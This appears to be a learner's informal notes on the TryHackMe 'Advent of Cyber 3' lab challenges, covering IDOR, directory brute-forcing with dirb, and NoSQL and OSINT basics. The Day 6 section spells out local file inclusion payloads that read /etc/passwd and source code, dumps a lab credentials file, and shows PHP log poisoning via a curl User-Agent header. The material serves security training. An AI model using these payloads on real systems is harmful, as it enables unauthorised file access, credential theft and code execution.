# Advent of Cyber 3




## Task 6 Day 1 Save The Gifts 

### What is an IDOR vulnerability?

IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability. An access control vulnerability is when an attacker can gain access to information or actions not intended for them. An IDOR vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), and too much trust has been placed on that input data, and the web application does not validate whether the user should, in fact, have access to the requested object.

## Task 7 Day 2 Web Exploitation Elf HR Problems 

Very interesting cookie manipulation. 

Tools: 
https://gchq.github.io/CyberChef/


## Task 8 Day 3 

Using wordlist to find hidden folders and files.

Tools: 
- https://github.com/danielmiessler/SecLists
- https://www.kali.org/tools/seclists/#seclists

More rooms 
- https://tryhackme.com/room/contentdiscovery
- https://tryhackme.com/jr/authenticationbypass
- https://tryhackme.com/room/idor

I am using my kali in virtual machine so I had to download the seclists first. 
`sudo apt install seclists`  

we using dirb - Web Content scanner
for me it is hard to find the right wordlist for the given task.
### Using a common wordlist for discovering content, enumerate http://10.10.235.43 to find the location of the administrator dashboard. What is the name of the folder? 
After search with some lists i found something with the list common.txt
`dirb http://10.10.235.43 /usr/share/seclists/Discovery/Web-Content/common.txt` 

- browse the ip in the browser
- surf to the found dir 
- add username administrator
- guess the password 

find the flag.


After that you can easily guess the password and find the flag

 What variant of FTP is running on it? 





## Task 11 Day 6 Path Management is Hard

1. try to read passwd
https://10-10-57-23.p.thmlabs.com/index.php?err=php://filter/resource=/etc/passwd

2. using base64 encoding to read the index.php
https://10-10-57-23.p.thmlabs.com/index.php?err=php://filter/convert.base64-encode/resource=index.php`

3. decode the base64 String into readable

```
echo "PD9waHAgc2Vzc2lvbl9zdGFydCgpOwokZmxhZyA9ICJUSE17NzkxZDQzZDQ2MDE4YTBkODkzNjFkYmY2MGQ1ZDllYjh9IjsKaW5jbHVkZSgiLi9pbmNsdWRlcy9jcmVkcy5waHAiKTsKaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddID09PSAkVVNFUil7ICAgICAgICAgICAgICAgICAgICAgICAgCgloZWFkZXIoICdMb2NhdGlvbjogbWFuYWdlLnBocCcgKTsKCWRpZSgpOwp9IGVsc2UgewoJJGxhYk51bSA9ICIiOwogIHJlcXVpcmUgIi4vaW5jbHVkZXMvaGVhZGVyLnBocCI7Cj8+CjxkaXYgY2xhc3M9InJvdyI+CiAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICA8L2Rpdj4KICA8ZGl2IGNsYXNzPSJjb2wtbGctOCBjb2wtb2Zmc2V0LTEiPgogICAgICA8P3BocCBpZiAoaXNzZXQoJGVycm9yKSkgeyA/PgogICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQgdGV4dC1kYW5nZXIiPjxiPjw/cGhwIGVjaG8gJGVycm9yOyA/PjwvYj48L3NwYW4+CiAgICAgIDw/cGhwIH0KCj8+CiA8cD5XZWxjb21lIDw/cGhwIGVjaG8gZ2V0VXNlck5hbWUoKTsgPz48L3A+Cgk8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1kYW5nZXIiIHJvbGU9ImFsZXJ0Ij5UaGlzIHNlcnZlciBoYXMgc2Vuc2l0aXZlIGluZm9ybWF0aW9uLiBOb3RlIEFsbCBhY3Rpb25zIHRvIHRoaXMgc2VydmVyIGFyZSBsb2dnZWQgaW4hPC9kaXY+IAoJPC9kaXY+Cjw/cGhwIGlmKCRlcnJJbmNsdWRlKXsgaW5jbHVkZSgkX0dFVFsnZXJyJ10pO30gPz4KPC9kaXY+Cgo8P3BocAp9Cj8+" | base64 --decode
```

Found something in index.php 
*include("./includes/creds.php");*

https://10-10-57-23.p.thmlabs.com/index.php?err=php://filter/convert.base64-encode/resource=./includes/creds.php
``` echo "
PD9waHAgCiRVU0VSID0gIk1jU2tpZHkiOwokUEFTUyA9ICJBMEMzMTVBdzNzMG0iOwo/" | base64 --decode
<?php 
$USER = "McSkidy";
$PASS = "A0C315Aw3s0m";
``` 

log in with these credetials and find the flag.

see the log file.

visit the website via curl
`curl -A "marmelade was here" https://10-10-57-23.p.thmlabs.com/login.php`

inject php code via curl into the log.
`curl -A "<?php phpinfo();?>" https://10-10-57-23.p.thmlabs.com/login.php`

now log out
the log files located here: ./includes/logs/app_access.log

Using lfi to view the content of phpinfo.

https://10-10-57-23.p.thmlabs.com/index.php?err=php://filter/resource=./includes/logs/app_access.log

the hostname is under System

very nice walkthrough and more.
https://www.youtube.com/watch?v=pGPE5uCI5h8

## Task 12 Day 7 Migration without Security
Today we learn something new about NoSQL and mongo. 

- Collections are similar to tables or views in MySQL and MSSQL.
- Documents are similar to rows or records in MySQL and MSSQL.
- Fields are similar to columns in MySQL and MSSQL.

connect via ssh to the server with mongo db.
.
.
.

## Task 21 Day 16 OSINT 
learn interesting stuff about Google dorking.

https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06#google-dork-cheatsheet

Learn how to research on the web and use the power of google. And all the information that is public.

task for me:
- make more notes, 
- find information to a specific target a
- nd put them together.

### Obsidian
Discover the obsidian to manage notes.
https://obsidian.md/
seems to be an good alternative to evernote.
https://de.wikipedia.org/wiki/Zettelkasten

## Task Day 17 Cloud Elf Leaks 




